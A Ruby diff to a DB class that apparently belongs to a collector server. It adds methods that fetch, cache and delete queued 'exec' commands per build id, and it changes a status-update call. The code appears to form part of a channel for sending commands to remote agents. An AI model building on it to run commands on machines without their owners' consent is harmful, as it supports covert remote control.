@@ -172,11 +172,11 @@ class DB
     return false
   end
 
-  def update_status(component, ip, status, message, stats, nc = false)
+  def update_status(component, ip, status, message, stats, type, version)
     return unless @available
 
     trace :debug, "[#{component}]: #{status} #{message} #{stats}"
-    db_rest_call :status_update, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu], nc
+    db_rest_call :status_update, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu], type, version
   end
 
   def factory_key_of(build_id)
@@ -459,6 +459,42 @@ class DB
     return values
   end
 
+  def new_exec?(bid)
+    # check if we have any exec in the cache
+    # probably and old one not yet sent
+    return true if DBCache.new_exec? bid
+    # cannot reach the db, return false
+    return false unless @available
+
+    # retrieve the exec from the db
+    commands = db_rest_call :new_exec, bid
+
+    # put the download in the cache
+    DBCache.save_exec bid, commands unless (commands.nil? or commands.empty?)
+
+    return (commands.nil? or commands.empty?) ? false : true
+  end
+
+  def new_exec(bid)
+    # retrieve the downloads from the cache
+    commands = DBCache.new_exec bid
+
+    return [] if commands.empty?
+
+    down = []
+    # remove the exec from the db
+    commands.each_pair do |key, value|
+      # delete the entry from the db
+      db_rest_call :del_exec, bid, key if @available
+      # return only the filename
+      down << value
+    end
+
+    # delete the download from the cache
+    DBCache.del_exec bid
+
+    return down
+  end
 
   def proxies
     # return empty if not available
@@ -520,6 +556,11 @@ class DB
   def collector_add_log(id, time, type, desc)
     return unless @available
     db_rest_call :collector_add_log, id, time, type, desc
+  end
+
+  def get_network_cert(file)
+    return unless @available
+    db_rest_call :get_network_cert, file
   end
 
 end #DB
